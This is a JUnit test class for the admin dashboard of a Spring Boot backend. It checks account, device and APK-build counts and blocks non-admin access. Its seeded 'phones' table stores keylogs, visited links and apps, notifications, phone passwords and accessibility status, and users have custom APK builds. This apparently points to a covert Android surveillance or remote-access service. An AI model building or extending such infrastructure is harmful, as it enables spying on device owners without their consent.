package com.mm.backend;

import static org.hamcrest.Matchers.greaterThanOrEqualTo;
import static org.hamcrest.Matchers.is;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import java.sql.Timestamp;
import java.time.Instant;
import java.time.temporal.ChronoUnit;

import com.fasterxml.jackson.databind.ObjectMapper;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class AdminDashboardTests {

    @Autowired MockMvc mvc;
    @Autowired JdbcTemplate jdbc;
    @Autowired ObjectMapper mapper;

    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();

    @BeforeEach
    void seed() {
        jdbc.update("DELETE FROM admin_action_logs");
        jdbc.update("DELETE FROM login_logs");
        jdbc.update("DELETE FROM error_logs");
        jdbc.update("DELETE FROM custom_app");
        jdbc.update("DELETE FROM phones");
        jdbc.update("DELETE FROM users");

        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (1, 'admin', '', 'admin@example.test', ?, '2030-12-31', '12 Month', NULL, NULL, 'admin', 0)
            """, encoder.encode("admin-pass"));
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (2, 'liveuser', '', 'live@example.test', ?, '2030-12-31', '12 Month', NULL, NULL, 'clients', 0)
            """, encoder.encode("u"));
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (3, 'expired', '', 'e@example.test', ?, '2020-01-01', '1 Month', NULL, NULL, 'clients', 0)
            """, encoder.encode("u"));
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (4, 'hiddenuser', '', 'h@example.test', ?, '2030-12-31', '12 Month', NULL, NULL, 'clients', 1)
            """, encoder.encode("u"));

        Timestamp recent = Timestamp.from(Instant.now().minus(2, ChronoUnit.MINUTES));
        Timestamp stale = Timestamp.from(Instant.now().minus(2, ChronoUnit.HOURS));
        jdbc.update("""
            INSERT INTO phones (phone_id, usrname, phone_name, country, address, android_ver, model,
              phonepassword, phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              keylogs_dates, visited_links, visited_apps, notifications, activities, phone_options,
              session_id, isonline, isRemoved, phoneopen, accessibility)
            VALUES ('p-online', 'liveuser', 'Pixel', 'US', '1.2.3.4', '14', 'Pixel7', '', '', NULL,
              '90', 'wifi', '2026-04-01', ?, '', '', '', '', '', '', 's', 1, 0, 1, '1')
            """, recent);
        jdbc.update("""
            INSERT INTO phones (phone_id, usrname, phone_name, country, address, android_ver, model,
              phonepassword, phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              keylogs_dates, visited_links, visited_apps, notifications, activities, phone_options,
              session_id, isonline, isRemoved, phoneopen, accessibility)
            VALUES ('p-stale', 'liveuser', 'OldPhone', 'US', '5.6.7.8', '12', 'Mi9', '', '', NULL,
              '40', '4g', '2025-12-01', ?, '', '', '', '', '', '', 's', 0, 0, 0, '0')
            """, stale);

        jdbc.update("""
            INSERT INTO custom_app (user_id, app_package, app_path, appname, app_ico, build_date, build_state)
            VALUES (2, 'com.test.one', '/p/com.test.one/com.test.one.apk', 'One', '', ?, 'finished')
            """, java.time.LocalDate.now().toString() + " 10:00");
        jdbc.update("""
            INSERT INTO custom_app (user_id, app_package, app_path, appname, app_ico, build_date, build_state)
            VALUES (2, 'com.test.two', '/p/com.test.two/com.test.two.apk', 'Two', '', '2020-01-01 10:00', 'failed')
            """);
        jdbc.update("""
            INSERT INTO custom_app (user_id, app_package, app_path, appname, app_ico, build_date, build_state)
            VALUES (2, 'com.test.three', '/p/com.test.three/com.test.three.apk', 'Three', '', '2020-01-02 10:00', 'onbuild')
            """);

        jdbc.update("INSERT INTO login_logs (username, success, ip, user_agent, reason) VALUES ('admin', 1, '1.1.1.1', 'JUnit', 'ok')");
        jdbc.update("INSERT INTO login_logs (username, success, ip, user_agent, reason) VALUES ('admin', 0, '2.2.2.2', 'JUnit', 'invalid_credentials')");
    }

    @Test
    void statsReturnsAccurateNumbers() throws Exception {
        String token = login();
        MvcResult res = mvc.perform(get("/api/admin/dashboard/stats").header("X-Auth-Token", token))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.accounts.total", is(4)))
            .andExpect(jsonPath("$.accounts.expired", is(1)))
            .andExpect(jsonPath("$.accounts.hidden", is(1)))
            .andExpect(jsonPath("$.devices.total", is(2)))
            .andExpect(jsonPath("$.devices.online", is(1)))
            .andExpect(jsonPath("$.devices.offline", is(1)))
            .andExpect(jsonPath("$.builds.total", is(3)))
            .andExpect(jsonPath("$.builds.finished", is(1)))
            .andExpect(jsonPath("$.builds.failed", is(1)))
            .andExpect(jsonPath("$.builds.onbuild", is(1)))
            .andExpect(jsonPath("$.builds.today", greaterThanOrEqualTo(1)))
            .andExpect(jsonPath("$.recentLogins", org.hamcrest.Matchers.hasSize(greaterThanOrEqualTo(2))))
            .andReturn();
        // Sanity: response is JSON.
        org.assertj.core.api.Assertions.assertThat(res.getResponse().getContentType()).contains("application/json");
    }

    @Test
    void nonAdminCannotReachDashboard() throws Exception {
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (9, 'plain', '', 'p@example.test', ?, '2030-12-31', '12 Month', NULL, NULL, 'clients', 0)
            """, encoder.encode("pwd"));
        String token = loginAs("plain", "pwd");
        mvc.perform(get("/api/admin/dashboard/stats").header("X-Auth-Token", token))
            .andExpect(status().isForbidden());
    }

    private String login() throws Exception { return loginAs("admin", "admin-pass"); }

    private String loginAs(String username, String password) throws Exception {
        MvcResult res = mvc.perform(post("/api/auth.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"usrname\":\"" + username + "\",\"password\":\"" + password + "\"}"))
            .andExpect(status().isOk())
            .andReturn();
        return mapper.readTree(res.getResponse().getContentAsString()).path("token").asText();
    }
}
